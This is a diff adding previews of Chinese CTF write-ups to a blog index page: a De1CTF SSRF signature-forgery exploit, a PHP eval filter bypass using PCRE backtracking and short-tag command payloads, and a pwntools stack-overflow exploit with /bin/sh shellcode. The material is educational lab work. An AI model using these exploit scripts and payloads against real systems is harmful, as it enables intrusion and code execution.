@@ -131,6 +131,183 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/09/08/De1ctf2019-SSRFMe-wp/" >De1ctf2019 SSRF Me wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-09-08
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">题目链接</a>  </p>
+<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><p>打开页面  得到源码 整理</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip,</span>):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):</span><br><span class="line">            <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> self.checkSign():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;scan&#x27;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&#x27;./%s/result.txt&#x27;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> resp == <span class="string">&#x27;Connection Timeout&#x27;</span>:</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;read&#x27;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&#x27;./%s/result.txt&#x27;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&#x27;Action Error&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Sign Error&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/geneSign&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&#x27;param&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    action = <span class="string">&#x27;scan&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&#x27;action&#x27;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&#x27;param&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&#x27;sign&#x27;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No Hacker!!!!&#x27;</span></span><br><span class="line"></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;code.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>):</span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Connection Timeout&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):</span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&#x27;gopher&#x27;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>三个路由：</p>
+<ol>
+<li><code>/</code> → 展示源码</li>
+<li><code>/geneSign</code> → 根据<code>param</code>生成数字签名</li>
+<li><code>/De1ta</code> → 在cookie中获取<code>action, sign</code>，并get <code>param</code>（过滤了 gopher 和 file ）  然后新建<code>Task</code>并执行<code>task.Exec</code><ol>
+<li><code>21#</code>根据传入的ip生成沙盒文件夹</li>
+<li><code>29#</code>根据 param 和 action 检查签名是否有效</li>
+<li><code>30#</code>如果 action 中有 <code>scan</code>  则执行 <code>83#</code> ，将结果写入 &#x2F;{sandbox}&#x2F;result.txt </li>
+<li><code>40#</code>如果 action 中有 <code>read</code> 则读取 result.txt 并回显</li>
+</ol>
+</li>
+</ol>
+<h2 id="0x2-攻击方法"><a href="#0x2-攻击方法" class="headerlink" title="0x2 攻击方法"></a>0x2 攻击方法</h2><p>由于<code>86#</code>urllib.urlopen可以以文件名作为参数打开，尝试scan <code>code.txt</code>然后 read</p>
+<p>由于数字签名校验，我们需要先获取sign再向<code>/De1ta</code>发请求    scan方法可以直接通过<code>/geneSign → 63#</code>获取，但是 read 方法不行</p>
+<p>且生成需要<code>secret_key</code>（16个随即字节） 不考虑爆破</p>
+<p>但同时发现<code>30#</code>和<code>40#</code>判断用的是<code>in</code>而不是<code>is</code>  可能有攻击点  尝试拼接  </p>
+<p>很明显  向<code>/De1ta</code>发请求时 <code>action=readscan</code>  这样既会读又会写   向<code>/geneSign</code>请求时只要在param的末尾加上<code>read</code>  这样生成的sign就和<code>53#</code>生成的sign相同  绕过检测</p>
+<h2 id="0x3-exp"><a href="#0x3-exp" class="headerlink" title="0x3 exp"></a>0x3 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">dest</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28719/geneSign&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;param&#x27;</span>: dest + <span class="string">&#x27;read&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> requests.post(url=url, params=data).text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">dest</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28719/De1ta&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;param&#x27;</span>: dest&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;readscan&#x27;</span>, <span class="string">&#x27;sign&#x27;</span>: <span class="built_in">str</span>(getSign(dest))&#125;</span><br><span class="line">    res = requests.post(url=url, params=data, cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">get_content(dst)</span><br><span class="line"><span class="comment"># &#123;&quot;code&quot;: 200, &quot;data&quot;: &quot;NSSCTF&#123;cbbd7581-79f0-4636-b907-c45578de18f6&#125;\n&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/09/08/De1ctf2019-SSRFMe-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/09/05/NISACTF2022-middlerce-wp/" >NISACTF2022-middlerce-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-09-05
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">题目链接</a>  </p>
+<h2 id="0x1-分析"><a href="#0x1-分析" class="headerlink" title="0x1 分析"></a>0x1 分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>严格正则过滤，尝试PCRE回溯绕过</p>
+<blockquote>
+<p>具体见 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+</blockquote>
+<h2 id="0x2-exp"><a href="#0x2-exp" class="headerlink" title="0x2 exp"></a>0x2 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;system(\&#x27;ls\&#x27;);&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span>	<span class="comment"># 回溯得用@^等特殊字符</span></span><br><span class="line">data = &#123; <span class="string">&#x27;letter&#x27;</span>: js &#125;</span><br><span class="line">res = requests.post(url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28296/&#x27;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>但是得到<code>差一点点捏</code>  尝试多次发现system, exec, assert等都被过滤   尝试使用短标签</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`ls`;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>?&gt;闭合了eval自带的&lt;?标签  接下来使用了短标签   <code>&lt;?=</code>相当于<code>&lt;?echo</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`ls /`;?&gt;&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">js = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`nl /f*`;?&gt;&quot;, &quot;t&quot;:&quot;&#x27;</span> + <span class="string">&#x27;@&#x27;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span>	<span class="comment"># cat, tac, flag都被过滤</span></span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/09/05/NISACTF2022-middlerce-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/09/05/XCTFQuals2016-b0verfl0w-wp/" >X-CTF Quals2016 b0verfl0w-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-09-05
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p>[相关资源](<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF</a> Quals 2016 - b0verfl0w)  </p>
+<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec b0verfl0w</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>明显栈溢出</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int <span class="function"><span class="title">vul</span></span>() &#123;</span><br><span class="line">  char s[32]; // [esp+18h] [ebp-20h] BYREF</span><br><span class="line">  puts(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  fgets(s, 50, stdin);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  <span class="built_in">return</span> 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>栈上可执行 首先想着就是在s数组中写入shellcode然后跳转到s   但因为aslr栈地址随机化无法知道s的地址  也没有别的后门函数</p>
+<p>查看<code>jmp</code>gadget发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary b0verfl0w --only &quot;ret|jmp&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">[...]</span><br><span class="line">0x08048504 : jmp esp</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h3 id="jmp-esp用处"><a href="#jmp-esp用处" class="headerlink" title="jmp esp用处"></a>jmp esp用处</h3><p>当当前函数执行到<code>leave</code>指令后（即<code>mov esp, ebp;pop ebp</code>），esp指向<code>ret addr</code>，接着<code>ret</code>跳转执行 <code>esp = esp + 4; eip = ret addr</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|------------|------...----|     |------------|------...----|</span><br><span class="line">|  addr 0x11 |      ...    |  →  | addr 0x11  |      ...    |</span><br><span class="line">|------------|------...----|     |------------|------...----|</span><br><span class="line">↑ esp 									   ↑ esp     eip = 0x11</span><br></pre></td></tr></table></figure>
+
+<p>但如果ret addr处地址为<code>jmp esp</code>的地址  则执行完jmp之后，eip和esp指向同一块位置，也就是接着执行栈上的指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|------------|------...----|      |------------|------...----|</span><br><span class="line">|  addr 0x11 |      ...    |  →   | addr 0x11  |      ...    |</span><br><span class="line">|------------|------...----|      |------------|------...----|</span><br><span class="line">↑ esp 	                                       ↑ esp   eip = 0x11(jmp esp)</span><br><span class="line">               |------------|------...----|</span><br><span class="line"> ➤ jmp esp ➤   | addr 0x11  |      ...    |</span><br><span class="line">               |------------|------...----|</span><br><span class="line">                            ↑ esp,eip</span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以在ret addr之后写入汇编指令  但是由于只有<code>50 - 32 = 18</code>字节的溢出空间，显然不够写入完整shellcode </p>
+<p>但是可以把shellcode写入变量s  在ret addr之后写入<code>sub esp, 0x28;jmp esp</code>   0x20(s) + 0x4(old ebp) + 0x4(ret addr) &#x3D; 0x28</p>
+<p>这样子就可以把esp移到变量s的地址，然后跳转执行s里的shellcode</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    mode = sys.argv[<span class="number">1</span>]</span><br><span class="line">proc = process(<span class="string">&quot;./b0verfl0w&quot;</span>)</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b * 0x0804857A</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode, from https://shell-storm.org/shellcode/files/shellcode-811.html</span></span><br><span class="line">shcode = <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;</span></span><br><span class="line">shcode += <span class="string">b&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;</span>   </span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0804836a</span></span><br><span class="line">jmp_esp = <span class="number">0x08048504</span></span><br><span class="line">sub_esp_jmp = asm(<span class="string">&quot;sub esp, 0x28;jmp esp&quot;</span>)	<span class="comment"># move esp back to s, then jmp to esp</span></span><br><span class="line"></span><br><span class="line">proc.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>, shcode.ljust(<span class="number">0x24</span>, <span class="string">b&#x27;h&#x27;</span>) + p32(jmp_esp) + sub_esp_jmp)</span><br><span class="line"></span><br><span class="line">proc.interactive()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/09/05/XCTFQuals2016-b0verfl0w-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
+									<a href="/2023/09/04/NISACTF2022-isSecret-wp/" >NISACTF2022-isSecret-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-09-04
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2102">题目链接</a>  </p>
+<p>显示<code>Welcome To Find Secret</code></p>
+<p>访问<code>/secret</code>，看到<code>Tell me your secret.I will encrypt it so others can&#39;t see</code></p>
+<p>传secret参数<code>/secret?secret=123456</code>发现报错</p>
